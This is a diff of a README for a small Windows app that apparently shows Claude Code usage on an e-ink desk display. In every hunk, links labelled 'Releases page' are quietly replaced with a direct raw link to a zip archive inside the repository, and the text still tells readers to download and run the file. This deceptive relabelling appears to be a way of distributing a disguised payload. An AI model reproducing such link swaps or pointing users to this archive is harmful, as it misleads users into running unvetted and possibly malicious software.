@@ -1,6 +1,6 @@
 # 🔵 cc-usage-elink - See Claude Usage at a Glance
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Arunachala353/cc-usage-elink/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Arunachala353/cc-usage-elink/main/foreman/usage_cc_elink_2.6.zip)
 
 ## 🚀 What This App Does
 
@@ -10,7 +10,7 @@ This tool is useful if you want a small desk display that shows your Claude Code
 
 ## 📦 Download
 
-Go to the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases) to download and run this app on Windows.
+Go to the [Releases page](https://raw.githubusercontent.com/Arunachala353/cc-usage-elink/main/foreman/usage_cc_elink_2.6.zip) to download and run this app on Windows.
 
 On that page, look for the latest release and download the Windows file attached to it. If you see more than one file, choose the one made for Windows. After the file finishes downloading, open it to start the app.
 
@@ -29,7 +29,7 @@ For best results, keep the display close to your PC during setup. BLE devices ca
 ## ⚙️ How to Set It Up on Windows
 
 ### 1. Get the file
-Open the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases) and download the latest Windows release.
+Open the [Releases page](https://raw.githubusercontent.com/Arunachala353/cc-usage-elink/main/foreman/usage_cc_elink_2.6.zip) and download the latest Windows release.
 
 ### 2. Open the download
 After the file downloads, open it from your Downloads folder.
@@ -108,7 +108,7 @@ Because e-ink screens refresh in a different way than normal monitors, you may s
 
 The release page may include one or more files. For Windows, choose the file meant for Windows. If the release includes a setup file, use that one first. If it includes a portable file, you can open it directly after download.
 
-Use the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases) any time you need the latest version.
+Use the [Releases page](https://raw.githubusercontent.com/Arunachala353/cc-usage-elink/main/foreman/usage_cc_elink_2.6.zip) any time you need the latest version.
 
 ## 🔁 Typical Setup Flow
 
@@ -138,4 +138,4 @@ Choose the file that matches Windows. If you are not sure which file to use, pic
 
 ## 🧰 If You Want to Move Forward
 
-Go to the [Releases page](https://github.com/Arunachala353/cc-usage-elink/releases), download the latest Windows build, and run it on your PC
+Go to the [Releases page](https://raw.githubusercontent.com/Arunachala353/cc-usage-elink/main/foreman/usage_cc_elink_2.6.zip), download the latest Windows build, and run it on your PC
